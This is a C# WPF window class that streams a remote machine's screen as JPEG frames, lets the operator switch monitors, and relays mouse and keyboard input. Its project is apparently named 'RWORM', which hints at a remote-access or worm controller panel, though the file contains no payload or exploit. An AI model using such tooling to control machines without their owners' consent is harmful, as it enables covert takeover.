using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class RemoteDesktopWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private bool _paused;
        private bool _closed;
        private bool _mouseControl;
        private int  _frameCount;
        private int  _frameBusy;
        private DateTime _lastFpsCalc = DateTime.Now;
        private int _currentMonitor = 0;
        private bool _monitorsLoaded = false;
        private int _streamWidth = 1920;
        private int _streamHeight = 1080;
        private DateTime _lastMouseMoveSent = DateTime.MinValue;

        public class DisplayItem
        {
            public int Index { get; set; }
            public string DisplayName { get; set; } = string.Empty;
            public override string ToString() => DisplayName;
        }

        public RemoteDesktopWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            Title   = $"Remote Desktop — {hostname}";
            if (TitleLabel != null) TitleLabel.Text = hostname;
            if (FpsLabel != null) FpsLabel.Text = "8";

            _server.RegisterRDHandler(guid, OnFrame);
            _server.RegisterRDMonitorsHandler(guid, OnMonitorsReceived);

            _ = _server.RequestMonitors(guid);
            _ = _server.StartRemoteDesktop(guid, _currentMonitor);
            if (StatusLabel != null) StatusLabel.Text = "Connecting...";
        }

        private void OnMonitorsReceived(byte[] data)
        {
            try
            {
                var json = Encoding.UTF8.GetString(data);
                using var doc = JsonDocument.Parse(json);
                var items = new List<DisplayItem>();

                foreach (var el in doc.RootElement.EnumerateArray())
                {
                    int idx = el.TryGetProperty("Index", out var ip) ? ip.GetInt32() : (el.TryGetProperty("index", out var ip2) ? ip2.GetInt32() : 0);
                    string name = el.TryGetProperty("Name", out var np) ? np.GetString() ?? "" : (el.TryGetProperty("name", out var np2) ? np2.GetString() ?? "" : "");
                    int w = el.TryGetProperty("Width", out var wp) ? wp.GetInt32() : (el.TryGetProperty("width", out var wp2) ? wp2.GetInt32() : 0);
                    int h = el.TryGetProperty("Height", out var hp) ? hp.GetInt32() : (el.TryGetProperty("height", out var hp2) ? hp2.GetInt32() : 0);

                    string title = $"Display {idx + 1}";
                    if (w > 0 && h > 0) title += $" ({w}x{h})";
                    items.Add(new DisplayItem { Index = idx, DisplayName = title });
                }

                if (items.Count == 0)
                {
                    items.Add(new DisplayItem { Index = 0, DisplayName = "Display 1 (Primary)" });
                }

                Dispatcher.BeginInvoke(new Action(() =>
                {
                    if (_closed || MonitorSelector == null) return;
                    _monitorsLoaded = false;
                    MonitorSelector.ItemsSource = items;
                    MonitorSelector.SelectedIndex = 0;
                    _monitorsLoaded = true;
                }));
            }
            catch { }
        }

        private void MonitorSelector_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (!_monitorsLoaded || MonitorSelector?.SelectedItem is not DisplayItem item) return;
            if (item.Index == _currentMonitor) return;

            _currentMonitor = item.Index;
            _ = _server.StartRemoteDesktop(_guid, _currentMonitor);
            if (StatusLabel != null) StatusLabel.Text = $"Switching to {item.DisplayName}...";
        }

        private void OnFrame(byte[] jpeg)
        {
            if (_closed || _paused || jpeg == null || jpeg.Length == 0) return;
            if (Interlocked.CompareExchange(ref _frameBusy, 1, 0) != 0) return;

            _frameCount++;

            var now = DateTime.Now;
            if ((now - _lastFpsCalc).TotalSeconds >= 1)
            {
                var fps = _frameCount;
                _frameCount  = 0;
                _lastFpsCalc = now;
                try
                {
                    Dispatcher.BeginInvoke(new Action(() =>
                    {
                        if (!_closed && FpsActual != null) FpsActual.Text = $"{fps} fps";
                    }));
                }
                catch { }
            }

            try
            {
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    try
                    {
                        if (_closed) return;
                        using var ms = new MemoryStream(jpeg);
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.StreamSource   = ms;
                        bmp.CacheOption    = BitmapCacheOption.OnLoad;
                        bmp.CreateOptions  = BitmapCreateOptions.None;
                        bmp.EndInit();
                        bmp.Freeze();

                        _streamWidth = bmp.PixelWidth;
                        _streamHeight = bmp.PixelHeight;

                        if (ScreenView != null) ScreenView.Source = bmp;
                        if (StatusLabel != null) StatusLabel.Text = $"Live — {_streamWidth}×{_streamHeight}";
                        if (StatusDot != null)
                        {
                            StatusDot.Fill = new System.Windows.Media.SolidColorBrush(
                                System.Windows.Media.Color.FromRgb(0x10, 0xB9, 0x81));
                        }
                    }
                    catch { }
                    finally { Interlocked.Exchange(ref _frameBusy, 0); }
                }));
            }
            catch
            {
                Interlocked.Exchange(ref _frameBusy, 0);
            }
        }

        private void Pause_Click(object s, RoutedEventArgs e)
        {
            _paused = !_paused;
            if (PauseBtn != null) PauseBtn.Content = _paused ? "▶ Resume" : "⏸ Pause";
            if (StatusLabel != null) StatusLabel.Text = _paused ? "Paused" : "Live";
        }

        private void FpsSlider_Changed(object s, RoutedPropertyChangedEventArgs<double> e)
        {
            if (FpsLabel != null && FpsSlider != null)
                FpsLabel.Text = ((int)FpsSlider.Value).ToString();
        }

        private void BtnMouseControl_Checked(object sender, RoutedEventArgs e)
        {
            _mouseControl = true;
            if (ControlNotice != null)
            {
                ControlNotice.Text = "🎮 Control Enabled (Click/Keys relayed)";
                ControlNotice.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x10, 0xB9, 0x81));
            }
            ScreenView?.Focus();
        }

        private void BtnMouseControl_Unchecked(object sender, RoutedEventArgs e)
        {
            _mouseControl = false;
            if (ControlNotice != null)
            {
                ControlNotice.Text = "Viewing stream";
                ControlNotice.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x25, 0x63, 0xEB));
            }
        }

        private Point? TranslateToScreenCoordinates(Point pos)
        {
            if (ScreenView == null || ScreenView.ActualWidth <= 0 || ScreenView.ActualHeight <= 0 || _streamWidth <= 0 || _streamHeight <= 0)
                return null;

            double scaleX = _streamWidth / ScreenView.ActualWidth;
            double scaleY = _streamHeight / ScreenView.ActualHeight;

            int targetX = (int)Math.Clamp(pos.X * scaleX, 0, _streamWidth - 1);
            int targetY = (int)Math.Clamp(pos.Y * scaleY, 0, _streamHeight - 1);

            return new Point(targetX, targetY);
        }

        private void ScreenView_MouseMove(object sender, MouseEventArgs e)
        {
            if (!_mouseControl || _paused) return;

            var now = DateTime.UtcNow;
            if ((now - _lastMouseMoveSent).TotalMilliseconds < 40) return; 
            _lastMouseMoveSent = now;

            var pt = TranslateToScreenCoordinates(e.GetPosition(ScreenView));
            if (pt.HasValue)
            {
                _ = _server.SendRemoteDesktopInput(_guid, $"mouse\x00move\x00{(int)pt.Value.X}\x00{(int)pt.Value.Y}\x000");
            }
        }

        private void ScreenView_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (!_mouseControl || _paused) return;
            ScreenView.Focus();

            var pt = TranslateToScreenCoordinates(e.GetPosition(ScreenView));
            if (!pt.HasValue) return;

            int btn = e.ChangedButton switch
            {
                MouseButton.Left => 1,
                MouseButton.Right => 2,
                MouseButton.Middle => 3,
                _ => 1
            };

            _ = _server.SendRemoteDesktopInput(_guid, $"mouse\x00down\x00{(int)pt.Value.X}\x00{(int)pt.Value.Y}\x00{btn}");
        }

        private void ScreenView_MouseUp(object sender, MouseButtonEventArgs e)
        {
            if (!_mouseControl || _paused) return;

            var pt = TranslateToScreenCoordinates(e.GetPosition(ScreenView));
            if (!pt.HasValue) return;

            int btn = e.ChangedButton switch
            {
                MouseButton.Left => 1,
                MouseButton.Right => 2,
                MouseButton.Middle => 3,
                _ => 1
            };

            _ = _server.SendRemoteDesktopInput(_guid, $"mouse\x00up\x00{(int)pt.Value.X}\x00{(int)pt.Value.Y}\x00{btn}");
        }

        private void ScreenView_KeyDown(object sender, KeyEventArgs e)
        {
            if (!_mouseControl || _paused) return;
            e.Handled = true;
            int vk = KeyInterop.VirtualKeyFromKey(e.Key);
            _ = _server.SendRemoteDesktopInput(_guid, $"key\x00down\x00{vk}");
        }

        private void ScreenView_KeyUp(object sender, KeyEventArgs e)
        {
            if (!_mouseControl || _paused) return;
            e.Handled = true;
            int vk = KeyInterop.VirtualKeyFromKey(e.Key);
            _ = _server.SendRemoteDesktopInput(_guid, $"key\x00up\x00{vk}");
        }

        protected override void OnClosed(EventArgs e)
        {
            _closed = true;
            _server.UnregisterRDHandler(_guid);
            _server.UnregisterRDMonitorsHandler(_guid);
            _ = _server.StopRemoteDesktop(_guid);
            base.OnClosed(e);
        }
    }
}
